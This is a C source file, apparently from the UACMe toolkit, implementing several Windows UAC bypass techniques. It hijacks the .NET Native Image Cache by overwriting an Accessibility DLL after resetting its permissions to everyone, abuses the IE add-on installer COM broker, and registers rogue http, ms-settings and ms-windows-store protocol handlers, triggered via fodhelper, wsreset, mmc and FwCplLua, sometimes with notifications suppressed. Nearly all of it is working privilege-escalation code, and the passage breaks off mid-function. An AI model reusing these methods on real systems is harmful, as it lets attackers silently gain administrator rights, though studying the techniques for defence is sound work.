/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2021
*
*  TITLE:       AZAGARAMPUR.C
*
*  VERSION:     3.58
*
*  DATE:        01 Dec 2021
*
*  UAC bypass methods from AzAgarampur.
*
*  For description please visit original URL
*
*  https://github.com/AzAgarampur/byeintegrity-uac
*  https://github.com/AzAgarampur/byeintegrity2-uac
*  https://github.com/AzAgarampur/byeintegrity3-uac
*  https://github.com/AzAgarampur/byeintegrity4-uac
*  https://github.com/AzAgarampur/byeintegrity-lite
*  https://github.com/AzAgarampur/byeintegrity7-uac
*  https://github.com/AzAgarampur/byeintegrity8-uac
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"

#ifdef _WIN64
#include "pcasvc/w7/x64/pcasvc7_64.h"
#include "pcasvc/w8_10/x64/pcasvc64.h"
#else
#include "pcasvc/w7/x86-32/pcasvc7_32.h"
#include "pcasvc/w8_10/x86-32/pcasvc32.h"
#endif

/*
* ucmxNgenLogLastWrite
*
* Purpose:
*
* Query ngen.log last write time.
*
*/
BOOL ucmxNgenLogLastWrite(
    _Out_ FILETIME* LastWriteTime
)
{
    BOOL bResult = FALSE;
    HANDLE hFile;
    WCHAR szFileName[MAX_PATH * 2];

    LastWriteTime->dwLowDateTime = 0;
    LastWriteTime->dwHighDateTime = 0;

    _strcpy(szFileName, g_ctx->szSystemRoot);
    _strcat(szFileName, MSNETFRAMEWORK_DIR);

#ifdef _WIN64
    _strcat(szFileName, TEXT("64"));
#endif

    _strcat(szFileName, TEXT("\\"));
    _strcat(szFileName, NET4_DIR);
    _strcat(szFileName, TEXT("\\"));
    _strcat(szFileName, TEXT("ngen.log"));

    hFile = CreateFile(szFileName,
        GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        bResult = GetFileTime(hFile, NULL, NULL, LastWriteTime);
        CloseHandle(hFile);
    }

    return bResult;
}

/*
* ucmNICPoisonMethod
*
* Purpose:
*
* Bypass UAC by by Dll hijack of Native Image Cache.
*
*/
NTSTATUS ucmNICPoisonMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
    WCHAR szFileName[MAX_PATH * 2];
    WCHAR szTargetProc[MAX_PATH * 2];
    DWORD origSize = 0, bytesIO;
    PBYTE origFileBuffer = NULL;

    HANDLE hFile;

    LPWSTR oldSecurity = NULL;
    LPWSTR lpAssemblyFilePath = NULL, lpTargetFileName = NULL;

    BOOLEAN IsWin7, bSecurityReset = FALSE;

    FILETIME lastWriteTime, checkTime;

    INT iRetryCount = 50;

    GUID targetMVID;
    FUSION_SCAN_PARAM scanParam;

    do {

        IsWin7 = (g_ctx->dwBuildNumber < NT_WIN8_RTM);

        if (!fusUtilInitFusion(IsWin7 ? 2 : 4))
            break;

        if (!fusUtilGetAssemblyPathByName(ASSEMBLY_ACCESSIBILITY, &lpAssemblyFilePath))
            break;

        if (!fusUtilGetImageMVID(lpAssemblyFilePath, &targetMVID))
            break;

        if (!IsWin7) {

            ucmxNgenLogLastWrite(&lastWriteTime);

            //
            // Run NET maintenance tasks.
            //
            _strcpy(szFileName, g_ctx->szSystemDirectory);
            _strcat(szFileName, MSCHEDEXE_EXE);

            if (!supRunProcess2(szFileName,
                TEXT("Start"),
                NULL,
                SW_HIDE,
                SUPRUNPROCESS_TIMEOUT_DEFAULT))
            {
                break;
            }

            //
            // Wait for task completion.
            //

            do {

                Sleep(2000);

                if (FALSE == supIsProcessRunning(TEXT("ngentask.exe"))) {

                    if (ucmxNgenLogLastWrite(&checkTime)) {

                        if (CompareFileTime(&lastWriteTime, &checkTime) < 0) {
                            break;
                        }
                    }

                }

                --iRetryCount;

            } while (iRetryCount);

        }

        //
        // Locate target NI file.
        //
        scanParam.ReferenceMVID = &targetMVID;
        scanParam.lpFileName = NULL;

        _strcpy(szFileName, g_ctx->szSystemRoot);
        _strcat(szFileName, TEXT("assembly\\NativeImages_"));
        if (IsWin7)
            _strcat(szFileName, NET2_DIR);
        else
            _strcat(szFileName, NET4_DIR);

#ifdef _WIN64
        _strcat(szFileName, TEXT("_64"));
#else
        _strcat(szFileName, TEXT("_32"));
#endif
        _strcat(szFileName, TEXT("\\Accessibility\\"));

        if (!fusUtilScanDirectory(szFileName,
            TEXT("*.dll"),
            (pfnFusionScanFilesCallback)fusUtilFindFileByMVIDCallback,
            &scanParam))
        {
            break;
        }

        lpTargetFileName = scanParam.lpFileName;
        if (lpTargetFileName == NULL)
            break;

        //
        // Read existing file to memory.
        //
        origFileBuffer = supReadFileToBuffer(lpTargetFileName, &origSize);
        if (origFileBuffer == NULL)
            break;

        //
        // Remember old file security permissions.
        //
        oldSecurity = NULL;
        if (!ucmMasqueradedGetObjectSecurityCOM(lpTargetFileName,
            DACL_SECURITY_INFORMATION,
            SE_FILE_OBJECT,
            &oldSecurity))
        {
            break;
        }

        //
        // Reset target file permissions.
        //
        if (!ucmMasqueradedSetObjectSecurityCOM(lpTargetFileName,
            DACL_SECURITY_INFORMATION,
            SE_FILE_OBJECT,
            T_SDDL_ALL_FOR_EVERYONE))
        {
            break;
        }

        bSecurityReset = TRUE;

        //
        // Overwrite file with Fubuki.
        //
        hFile = CreateFile(lpTargetFileName,
            GENERIC_WRITE,
            0,
            NULL,
            OPEN_EXISTING,
            0,
            NULL);

        if (hFile != INVALID_HANDLE_VALUE) {
            WriteFile(hFile, ProxyDll, ProxyDllSize, &bytesIO, NULL);
            SetEndOfFile(hFile);
            CloseHandle(hFile);
        }
        else
            break;

        //
        // Run target.
        //
        _strcpy(szTargetProc, g_ctx->szSystemDirectory);
        _strcat(szTargetProc, MMC_EXE);

        if (supRunProcess2(szTargetProc,
            WF_MSC,
            NULL,
            SW_SHOW,
            SUPRUNPROCESS_TIMEOUT_DEFAULT))
        {
            MethodResult = STATUS_SUCCESS;
        }

    } while (FALSE);

    if (lpAssemblyFilePath)
        supHeapFree(lpAssemblyFilePath);

    //
    // Restore original file contents and permissions.
    //
    if (origFileBuffer && lpTargetFileName) {

        hFile = CreateFile(lpTargetFileName,
            GENERIC_WRITE,
            0,
            NULL,
            OPEN_EXISTING,
            0,
            NULL);

        if (hFile != INVALID_HANDLE_VALUE) {
            WriteFile(hFile, origFileBuffer, origSize, &bytesIO, NULL);
            SetEndOfFile(hFile);
            CloseHandle(hFile);
        }

        supVirtualFree(origFileBuffer, NULL);

        if (oldSecurity) {

            if (bSecurityReset) {

                ucmMasqueradedSetObjectSecurityCOM(lpTargetFileName,
                    DACL_SECURITY_INFORMATION,
                    SE_FILE_OBJECT,
                    oldSecurity);

            }

            CoTaskMemFree(oldSecurity);
        }

        supHeapFree(lpTargetFileName);
    }

    if (!NT_SUCCESS(MethodResult))
        supSetGlobalCompletionEvent();

    return MethodResult;
}

/*
* ucmIeAddOnInstallMethod
*
* Purpose:
*
* Bypass UAC by IE Admin Add-On Installer COM object.
*
*/
NTSTATUS ucmIeAddOnInstallMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
    HRESULT  r = E_FAIL, hr_init;

    IIEAdminBrokerObject* BrokerObject = NULL;
    IActiveXInstallBroker* InstallBroker = NULL;

    BSTR adminInstallerUuid = NULL;
    BSTR cacheItemFilePath = NULL, fileToVerify = NULL;

    ULONG dummy = 0;
    PUCHAR dummyPtr = NULL;

    PWCHAR lpPayloadFile = NULL, lpTargetDir = NULL, lpFileName = NULL, lpDirectory = NULL;
    SIZE_T cchBuffer;

    HANDLE processHandle = NULL;

    BSTR workdirBstr, emptyBstr;

    WCHAR szDummyTarget[MAX_PATH * 2];

    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    do {

        if (!supReplaceDllEntryPoint(
            ProxyDll,
            ProxyDllSize,
            FUBUKI_DEFAULT_ENTRYPOINT,
            TRUE))
        {
            break;
        }

        //
        // VerifyFile required.
        //
        r = CoInitializeSecurity(NULL,
            -1,
            NULL,
            NULL,
            RPC_C_AUTHN_LEVEL_CONNECT,
            RPC_C_IMP_LEVEL_IMPERSONATE,
            NULL,
            0,
            NULL);

        if (FAILED(r)) {
            break;
        }

        //
        // Allocated elevated factory object.
        //
        r = ucmAllocateElevatedObject(T_CLSID_IEAAddonInstaller,
            &IID_IEAxiAdminInstaller,
            CLSCTX_LOCAL_SERVER,
            &BrokerObject);

        if (FAILED(r)) {
            break;
        }

        r = BrokerObject->lpVtbl->InitializeAdminInstaller(BrokerObject,
            NULL,
            0,
            &adminInstallerUuid);

        if (FAILED(r)) {
            break;
        }

        //
        // Query install broker object.
        //
        r = BrokerObject->lpVtbl->QueryInterface(BrokerObject,
            &IID_IEAxiInstaller2,
            &InstallBroker);

        if (FAILED(r)) {
            break;
        }

        _strcpy(szDummyTarget, g_ctx->szSystemDirectory);
        _strcat(szDummyTarget, CONSENT_EXE);

        r = E_FAIL;

        //
        // Verify image embedded signature.
        // Uppon success copy given file to the temporary directory and return full filepath.
        //
        fileToVerify = SysAllocString(szDummyTarget);
        if (fileToVerify) {

            r = InstallBroker->lpVtbl->VerifyFile(InstallBroker,
                adminInstallerUuid,
                (HWND)INVALID_HANDLE_VALUE,
                fileToVerify,
                fileToVerify,
                NULL,
                WTD_UI_NONE,
                WTD_UICONTEXT_EXECUTE,
                &IID_IUnknown,
                &cacheItemFilePath,
                &dummy,
                &dummyPtr);

            if (dummyPtr)
                CoTaskMemFree(dummyPtr);

            SysFreeString(fileToVerify);
        }

        if (FAILED(r)) {
            break;
        }

        //
        // Kill file in cache
        //
        if (!ucmMasqueradedDeleteDirectoryFileCOM(cacheItemFilePath))
            break;

        //
        // Replace file in cache with Fubuki.
        //
        cchBuffer = (SIZE_T)SysStringLen(cacheItemFilePath);
        lpPayloadFile = (PWCHAR)supHeapAlloc(cchBuffer * 2);
        if (lpPayloadFile == NULL)
            break;

        lpTargetDir = (PWCHAR)supHeapAlloc(cchBuffer * 2);
        if (lpTargetDir == NULL)
            break;

        lpFileName = _filename(cacheItemFilePath);
        if (lpFileName == NULL)
            break;

        _strcpy(lpPayloadFile, g_ctx->szTempDirectory);
        _strcat(lpPayloadFile, lpFileName);

        if (!supWriteBufferToFile(lpPayloadFile, ProxyDll, ProxyDllSize))
            break;

        lpDirectory = _filepath(cacheItemFilePath, lpTargetDir);
        if (lpDirectory == NULL)
            break;

        if (!ucmMasqueradedMoveCopyFileCOM(lpPayloadFile, lpDirectory, TRUE))
            break;

        //
        // Run file from cache.
        //
        workdirBstr = SysAllocString(g_ctx->szTempDirectory);
        if (workdirBstr) {

            emptyBstr = SysAllocString(TEXT(""));
            if (emptyBstr) {

                r = InstallBroker->lpVtbl->RunSetupCommand(InstallBroker,
                    adminInstallerUuid,
                    NULL,
                    cacheItemFilePath,
                    emptyBstr,
                    workdirBstr,
                    emptyBstr,
                    4, //RSC_FLAG_QUIET
                    &processHandle); //there is always no process handle on output, ignore.

                SysFreeString(emptyBstr);
            }

            SysFreeString(workdirBstr);

            if (r == E_INVALIDARG)
                MethodResult = STATUS_SUCCESS;
        }

    } while (FALSE);

    //
    // Post execution cleanup.
    //

    if (InstallBroker)
        InstallBroker->lpVtbl->Release(InstallBroker);

    if (BrokerObject)
        BrokerObject->lpVtbl->Release(BrokerObject);

    if (adminInstallerUuid)
        SysFreeString(adminInstallerUuid);

    if (NT_SUCCESS(MethodResult) && lpDirectory) {
        ucmMasqueradedDeleteDirectoryFileCOM(lpDirectory);
    }

    if (cacheItemFilePath)
        SysFreeString(cacheItemFilePath);

    if (lpTargetDir)
        supHeapFree(lpTargetDir);

    if (lpPayloadFile)
        supHeapFree(lpPayloadFile);

    if (hr_init == S_OK)
        CoUninitialize();

    return MethodResult;
}

/*
* ucmWscActionProtocolMethod
*
* Purpose:
*
* Bypass UAC by SecurityCenter COM object and HTTP protocol registry hijack.
*
*/
NTSTATUS ucmWscActionProtocolMethod(
    _In_ LPCWSTR lpszPayload
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
    HRESULT  r = E_FAIL, hr_init;
    IWscAdmin* WscAdminObject = NULL;

    LPOLESTR protoGuidString = NULL;
    USER_ASSOC_PTR SetUserAssoc;
    GUID guid;

    RtlSecureZeroMemory(&SetUserAssoc, sizeof(USER_ASSOC_PTR));

    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    do {

        if (CoCreateGuid(&guid) != S_OK)
            break;

        if (StringFromCLSID(&guid, &protoGuidString) != S_OK)
            break;

        MethodResult = supFindUserAssocSet(&SetUserAssoc);
        if (!NT_SUCCESS(MethodResult)) {
            break;
        }

        MethodResult = supRegisterShellAssoc(T_PROTO_HTTP,
            protoGuidString,
            &SetUserAssoc,
            lpszPayload,
            FALSE,
            NULL);

        if (!NT_SUCCESS(MethodResult)) {
            break;
        }

        MethodResult = STATUS_ACCESS_DENIED;

        r = ucmAllocateElevatedObject(T_CLSID_SecurityCenter,
            &IID_WscAdmin,
            CLSCTX_LOCAL_SERVER,
            &WscAdminObject);

        if (SUCCEEDED(r)) {

            r = WscAdminObject->lpVtbl->Initialize(WscAdminObject);
            if (SUCCEEDED(r)) {

                supEnableToastForProtocol(T_PROTO_HTTP, FALSE);

                r = WscAdminObject->lpVtbl->DoModalSecurityAction(WscAdminObject, NULL, 103, NULL);

                Sleep(1000);

                if (SUCCEEDED(r)) MethodResult = STATUS_SUCCESS;

            }
        }

    } while (FALSE);

    //
    // Cleanup.
    //
    if (WscAdminObject)
        WscAdminObject->lpVtbl->Release(WscAdminObject);

    if (protoGuidString) {

        supUnregisterShellAssoc(T_PROTO_HTTP,
            protoGuidString,
            &SetUserAssoc);

        CoTaskMemFree(protoGuidString);
    }

    if (hr_init == S_OK)
        CoUninitialize();

    return MethodResult;
}

/*
* ucmFwCplLuaMethod2
*
* Purpose:
*
* Bypass UAC using FwCplLua undocumented COM interface and shell association registry hijack.
* This function expects that supMasqueradeProcess was called on process initialization.
*
* Note:
*
* Protocol name defined as const (e.g. pe386).
* ProgId generated with CoCreateGuid and will be different each run.
*
*/
NTSTATUS ucmFwCplLuaMethod2(
    _In_ LPCWSTR lpszPayload
)
{
    BOOL fEnvSet = FALSE, fDirCreated = FALSE;
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
    HRESULT r = E_FAIL, hr_init;
    ULONG DataSize = 0, SnapinSize = 0;
    SIZE_T nLen, PayloadDirNameLen = 0, MscBufferSize = 0, MscSize = 0, MscBytesIO = 0, ProtocolNameLen;
    PVOID SnapinResource = NULL, SnapinData = NULL, MscBufferPtr = NULL;
    PVOID ImageBaseAddress = g_hInstance;
    LPOLESTR protoGuidString = NULL;
    CHAR* pszMarker;
    IFwCplLua* FwCplLua = NULL;

    USER_ASSOC_PTR SetUserAssoc;
    GUID guid;
    WCHAR szBuffer[MAX_PATH + 1];
    WCHAR szPayloadDir[MAX_PATH * 2];
    CHAR szProtocol[MAX_PATH];

    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    RtlSecureZeroMemory(&SetUserAssoc, sizeof(USER_ASSOC_PTR));
    RtlSecureZeroMemory(&szPayloadDir, sizeof(szPayloadDir));

    do {

        //
        // Create GUID.
        //
        if (CoCreateGuid(&guid) != S_OK)
            break;

        if (StringFromCLSID(&guid, &protoGuidString) != S_OK)
            break;

        //
        // Convert protocol name to ANSI to be used in msc modification next.
        //
        ProtocolNameLen = _strlen(MYSTERIOUSCUTETHING);
        RtlSecureZeroMemory(szProtocol, sizeof(szProtocol));
        WideCharToMultiByte(CP_ACP, 0,
            MYSTERIOUSCUTETHING,
            -1,
            szProtocol,
            sizeof(szProtocol),
            NULL,
            NULL);

        _strcat_a(szProtocol, ":");

        //
        // Decrypt and decompress custom Kamikaze snap-in.
        //
        SnapinResource = supLdrQueryResourceData(
            KAMIKAZE_ID,
            ImageBaseAddress,
            &DataSize);

        if (SnapinResource) {
            SnapinData = g_ctx->DecompressRoutine(KAMIKAZE_ID, SnapinResource, DataSize, &SnapinSize);
            if (SnapinData == NULL)
                break;
        }
        else
            break;

        //
        // Create destination dir "system32" in %temp%
        //
        _strcpy(szPayloadDir, g_ctx->szTempDirectory);
        _strcat(szPayloadDir, SYSTEM32_DIR_NAME);
        PayloadDirNameLen = _strlen(szPayloadDir);
        if (!CreateDirectory(szPayloadDir, NULL)) {
            if (GetLastError() != ERROR_ALREADY_EXISTS)
                break;
        }

        fDirCreated = TRUE;

        //
        // Set new %windir% environment variable.
        //
        _strcpy(szBuffer, g_ctx->szTempDirectory);

        nLen = _strlen(szBuffer);
        if (szBuffer[nLen - 1] == L'\\') {
            szBuffer[nLen - 1] = 0;
        }

        fEnvSet = supSetEnvVariable(FALSE, NULL, T_WINDIR, szBuffer);
        if (fEnvSet == FALSE)
            break;

        //
        // Find UserAssocSet
        //
        MethodResult = supFindUserAssocSet(&SetUserAssoc);
        if (!NT_SUCCESS(MethodResult))
            break;

        //
        // Register shell protocol.
        //
        MethodResult = supRegisterShellAssoc(MYSTERIOUSCUTETHING,
            protoGuidString,
            &SetUserAssoc,
            lpszPayload,
            TRUE,
            NULL);

        if (!NT_SUCCESS(MethodResult))
            break;

        MscBufferSize = ALIGN_UP_BY(1 + (SIZE_T)SnapinSize + (SIZE_T)sizeof(szProtocol), (SIZE_T)PAGE_SIZE);
        MscBufferPtr = supVirtualAlloc(
            &MscBufferSize,
            DEFAULT_ALLOCATION_TYPE,
            DEFAULT_PROTECT_TYPE, NULL);
        if (MscBufferPtr == NULL)
            break;

        //
        // Reconfigure msc snapin and write it to the %temp%\system32.
        //
        pszMarker = _strstri_a((CHAR*)SnapinData, (const CHAR*)KAMIKAZE_MARKER);
        if (pszMarker) {

            //
            // Copy first part of snapin (unchanged).
            //
            MscBytesIO = (ULONG)(pszMarker - (PCHAR)SnapinData);
            MscSize = MscBytesIO;
            RtlCopyMemory(MscBufferPtr, SnapinData, MscBytesIO);

            //
            // Copy modified part.
            //

            MscBytesIO = ProtocolNameLen;

            //Include ":" element.
            MscBytesIO++;

            //Copy guid.
            RtlCopyMemory(RtlOffsetToPointer(MscBufferPtr, MscSize), (PVOID)&szProtocol, MscBytesIO);
            MscSize += MscBytesIO;

            //
            // Copy all of the rest.
            //
            while (*pszMarker != 0 && *pszMarker != '<') {
                pszMarker++;
            }

            MscBytesIO = (ULONG)(((PCHAR)SnapinData + SnapinSize) - pszMarker);
            RtlCopyMemory(RtlOffsetToPointer(MscBufferPtr, MscSize), pszMarker, MscBytesIO);
            MscSize += MscBytesIO;

            //
            // Write result to the file.
            //
            _strcat(szPayloadDir, TEXT("\\"));
            _strcat(szPayloadDir, WF_MSC);
            if (!supWriteBufferToFile(szPayloadDir, MscBufferPtr, (ULONG)MscSize))
                break;

            supSecureVirtualFree(MscBufferPtr, MscBufferSize, NULL);
            MscBufferPtr = NULL;
        }

        //
        // Get elevated COM object for FwCplLua interface.
        //
        r = ucmAllocateElevatedObject(
            T_CLSID_FwCplLua,
            &IID_IFwCplLua,
            CLSCTX_LOCAL_SERVER,
            &FwCplLua);

        if (r != S_OK)
            break;

        if (FwCplLua == NULL) {
            r = E_OUTOFMEMORY;
            break;
        }

        //
        // Execute method from FwCplLua interface.
        // This will trigger our payload as shell will attempt to run it.
        //
        r = FwCplLua->lpVtbl->LaunchAdvancedUI(FwCplLua);
        if (SUCCEEDED(r))
            MethodResult = STATUS_SUCCESS;

    } while (FALSE);

    //
    // Cleanup.
    //
    if (MscBufferPtr) {
        supSecureVirtualFree(MscBufferPtr, MscBufferSize, NULL);
    }
    if (SnapinData) {
        supSecureVirtualFree(SnapinData, SnapinSize, NULL);
    }

    if (FwCplLua != NULL) {
        FwCplLua->lpVtbl->Release(FwCplLua);
    }

    Sleep(2000);

    if (protoGuidString) {

        supUnregisterShellAssoc(MYSTERIOUSCUTETHING,
            protoGuidString,
            &SetUserAssoc);

        CoTaskMemFree(protoGuidString);
    }

    if (hr_init == S_OK)
        CoUninitialize();

    if (fEnvSet)
        supSetEnvVariable(TRUE, NULL, T_WINDIR, NULL);

    if (fDirCreated) {
        DeleteFile(szPayloadDir);
        szPayloadDir[PayloadDirNameLen] = 0;
        RemoveDirectory(szPayloadDir);
    }

    return MethodResult;
}

/*
* ucmMsSettingsProtocolMethod
*
* Purpose:
*
* Bypass UAC by registering own ms-settings protocol.
*
*/
NTSTATUS ucmMsSettingsProtocolMethod(
    _In_ LPCWSTR lpszPayload
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
    HRESULT hr_init;

    LPOLESTR protoGuidString = NULL;
    USER_ASSOC_PTR SetUserAssoc;
    GUID guid;

    WCHAR szBuffer[MAX_PATH * 2];

    RtlSecureZeroMemory(&SetUserAssoc, sizeof(USER_ASSOC_PTR));

    hr_init = CoInitializeEx(NULL, COINIT_MULTITHREADED);

    do {

        if (CoCreateGuid(&guid) != S_OK)
            break;

        if (StringFromCLSID(&guid, &protoGuidString) != S_OK)
            break;

        //
        // Find UserAssocSet
        //
        MethodResult = supFindUserAssocSet(&SetUserAssoc);
        if (!NT_SUCCESS(MethodResult))
            break;

        //
        // Register shell protocol.
        //
        MethodResult = supRegisterShellAssoc(T_MSSETTINGS,
            protoGuidString,
            &SetUserAssoc,
            lpszPayload,
            TRUE,
            NULL);

        if (NT_SUCCESS(MethodResult)) {

            _strcpy(szBuffer, g_ctx->szSystemDirectory);
            _strcat(szBuffer, FODHELPER_EXE);

            MethodResult = supRunProcess(szBuffer, NULL) ?
                STATUS_SUCCESS : STATUS_ACCESS_DENIED;

        }

    } while (FALSE);

    //
    // Cleanup.
    //
    if (protoGuidString) {

        supUnregisterShellAssoc(T_MSSETTINGS,
            protoGuidString,
            &SetUserAssoc);

        CoTaskMemFree(protoGuidString);
    }

    if (SUCCEEDED(hr_init))
        CoUninitialize();

    return MethodResult;
}

/*
* ucmxGetServiceState
*
* Purpose:
*
* Return service state.
*
*/
DWORD ucmxGetServiceState(
    _In_ SC_HANDLE ServiceHandle
)
{
    SERVICE_STATUS_PROCESS svcStatus;

    ULONG dummy;

    if (QueryServiceStatusEx(
        ServiceHandle,
        SC_STATUS_PROCESS_INFO,
        (LPBYTE)&svcStatus,
        sizeof(svcStatus),
        &dummy))
    {
        return svcStatus.dwCurrentState;
    }

    return SERVICE_STOPPED;
}

/*
* ucmxRunService
*
* Purpose:
*
* Start given service if stopped.
*
*/
BOOLEAN ucmxRunService(
    _In_ LPCWSTR lpServiceName
)
{
    BOOLEAN bRunning = FALSE;
    SC_HANDLE schManager = NULL, schService = NULL;
    ULONG dwState, uRetryCount;

    do {

        schManager = OpenSCManager(
            NULL,
            SERVICES_ACTIVE_DATABASE,
            SC_MANAGER_CONNECT);

        if (schManager == NULL)
            break;

        schService = OpenService(
            schManager,
            lpServiceName,
            SERVICE_QUERY_STATUS | SERVICE_START);

        if (schService == NULL)
            break;

        dwState = ucmxGetServiceState(schService);

        if (dwState == SERVICE_RUNNING) {
            bRunning = TRUE;
            break;
        }

        if (dwState == SERVICE_PAUSE_PENDING ||
            dwState == SERVICE_STOP_PENDING)
        {

            uRetryCount = 5;

            do {

                dwState = ucmxGetServiceState(schService);
                if (dwState == SERVICE_RUNNING) {
                    bRunning = TRUE;
                    break;
                }

                Sleep(1000);

            } while (--uRetryCount);

        }

        if (dwState == SERVICE_STOPPED) {

            if (StartService(schService, 0, NULL)) {

                Sleep(1000);

                dwState = ucmxGetServiceState(schService);
                if (dwState == SERVICE_RUNNING) {
                    bRunning = TRUE;
                    break;
                }

            }

        }

    } while (FALSE);

    if (schService)
        CloseServiceHandle(schService);

    if (schManager)
        CloseServiceHandle(schManager);

    return bRunning;
}

/*
* ucmxIsAppXSvcRunning
*
* Purpose:
*
* Return running state of AppXSvc (restart it if stopped).
*
*/
BOOLEAN ucmxIsAppXSvcRunning(
    VOID
)
{
    return ucmxRunService(T_APPXSVC);
}

/*
* ucmxCleanupNoStore
*
* Purpose:
*
* Remove store association key.
*
*/
VOID ucmxCleanupNoStore(
    VOID
)
{
    NTSTATUS ntStatus;
    HANDLE classesKey = NULL;
    WCHAR szBuffer[MAX_PATH + 1];

    ntStatus = supOpenClassesKey(NULL, &classesKey);
    if (!NT_SUCCESS(ntStatus))
        return;

    _strcpy(szBuffer, T_MSWINDOWSSTORE);
    _strcat(szBuffer, TEXT("\\shell"));
    supRegDeleteKeyRecursive(classesKey, szBuffer);

    NtClose(classesKey);
}

/*
* ucmxMsStoreProtocolNoStore
*
* Purpose:
*
* Bypass UAC by registering own ms-windows-store protocol.
*
*/
NTSTATUS ucmxMsStoreProtocolNoStore(
    _In_ LPCWSTR lpszPayload
)
{
    HANDLE classesKey = NULL, protoKey = NULL;
    NTSTATUS ntStatus;
    SIZE_T sz;
    WCHAR szBuffer[MAX_PATH + 1];

    ntStatus = supOpenClassesKey(NULL, &classesKey);
    if (!NT_SUCCESS(ntStatus))
        return ntStatus;

    if (ERROR_SUCCESS == RegCreateKeyEx(classesKey,
        T_MSWINDOWSSTORE,
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        MAXIMUM_ALLOWED,
        NULL,
        (HKEY*)&protoKey,
        NULL))
    {
        RegSetValueEx(protoKey, T_URL_PROTOCOL, 0, REG_SZ, NULL, 0);
        RegCloseKey(protoKey);
    }

    _strcpy(szBuffer, T_MSWINDOWSSTORE);
    _strcat(szBuffer, T_SHELL_OPEN);
    _strcat(szBuffer, TEXT("\\"));
    _strcat(szBuffer, T_SHELL_COMMAND);

    if (ERROR_SUCCESS == RegCreateKeyEx(classesKey,
        szBuffer,
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        MAXIMUM_ALLOWED,
        NULL,
        (HKEY*)&protoKey,
        NULL))
    {

        sz = (_strlen(lpszPayload) + 1) * sizeof(WCHAR);

        if (ERROR_SUCCESS == RegSetValueEx(protoKey,
            TEXT(""),
            0,
            REG_SZ,
            (BYTE*)lpszPayload,
            (DWORD)sz))
        {
            ntStatus = STATUS_SUCCESS;
        }
        else {
            ntStatus = STATUS_REGISTRY_IO_FAILED;
        }

        RegCloseKey(protoKey);
    }
    else {
        ntStatus = STATUS_REGISTRY_IO_FAILED;
    }

    NtClose(classesKey);

    return ntStatus;
}

/*
* ucmMsStoreProtocolMethod
*
* Purpose:
*
* Bypass UAC by registering own ms-windows-store protocol.
*
*/
NTSTATUS ucmMsStoreProtocolMethod(
    _In_ LPCWSTR lpszPayload
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
    HRESULT hr_init;

    LPOLESTR protoGuidString = NULL;
    USER_ASSOC_PTR SetUserAssoc;
    GUID guid;

    BOOLEAN bAppXRunning = FALSE;

    WCHAR szBuffer[MAX_PATH * 2];

    RtlSecureZeroMemory(&SetUserAssoc, sizeof(USER_ASSOC_PTR));

    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);


    do {

        bAppXRunning = ucmxIsAppXSvcRunning();
        if (bAppXRunning) {

            if (CoCreateGuid(&guid) != S_OK)
                break;

            if (StringFromCLSID(&guid, &protoGuidString) != S_OK)
                break;

            //
            // Find UserAssocSet
            //
            MethodResult = supFindUserAssocSet(&SetUserAssoc);
            if (!NT_SUCCESS(MethodResult)) {
                break;
            }

            supEnableToastForProtocol(T_MSWINDOWSSTORE, FALSE);

            //
            // Register shell protocol.
            //
            MethodResult = supRegisterShellAssoc(T_MSWINDOWSSTORE,
                protoGuidString,
                &SetUserAssoc,
                lpszPayload,
                TRUE,
                T_URL_MS_WIN_STORE);


        }
        else {
            //
            // AppXSvc not running or in inconsistent state, try other method.
            //
            MethodResult = ucmxMsStoreProtocolNoStore(lpszPayload);
        }

        if (NT_SUCCESS(MethodResult)) {

            _strcpy(szBuffer, g_ctx->szSystemDirectory);
            _strcat(szBuffer, WSRESET_EXE);

            MethodResult = supRunProcess2(
                szBuffer,
                NULL,
                TEXT("open"),
                SW_HIDE,
                INFINITE) ?
                STATUS_SUCCESS : STATUS_ACCESS_DENIED;

        }

    } while (FALSE);

    //
    // Cleanup.
    //
    if (bAppXRunning) {

        if (protoGuidString) {

            supUnregisterShellAssoc(T_MSWINDOWSSTORE,
                protoGuidString,
                &SetUserAssoc);

            CoTaskMemFree(protoGuidString);
        }
    }
    else {
        ucmxCleanupNoStore();
    }

    if (SUCCEEDED(hr_init))
        CoUninitialize();

    return MethodResult;
}

#define PCA_MONITOR_PROCESS_NORMAL 0
#define PCA_MONITOR_PROCESS_NOCHAIN 1
#define PCA_MONITOR_PROCESS_AS_INSTALLER 2

/*
* ucmxRemoveLoaderEntryFromRegistry
*
* Purpose:
*
* Cleanup registry entries.
*
*/
ULONG ucmxRemoveLoaderEntryFromRegistry(
    _In_ HKEY hRootKey,
    _In_ LPCWSTR lpRegPath,
    _In_ LPCWSTR lpLoaderName
)
{
    HKEY hKey;

    DWORD i, dwValuesCount = 0, cchValue, dwType, cRemoved = 0;

    WCHAR szValue[MAX_PATH + 1];

    do {
        if (ERROR_SUCCESS != RegOpenKeyEx(hRootKey,
            lpRegPath,
            0,
            KEY_READ | KEY_SET_VALUE,
            &hKey))
        {
            break;
        }

        if (ERROR_SUCCESS != RegQueryInfoKey(hKey,
            NULL,
            NULL,
            NULL,
            NULL,
            NULL,
            NULL,
            &dwValuesCount,
            NULL,
            NULL,
            NULL,
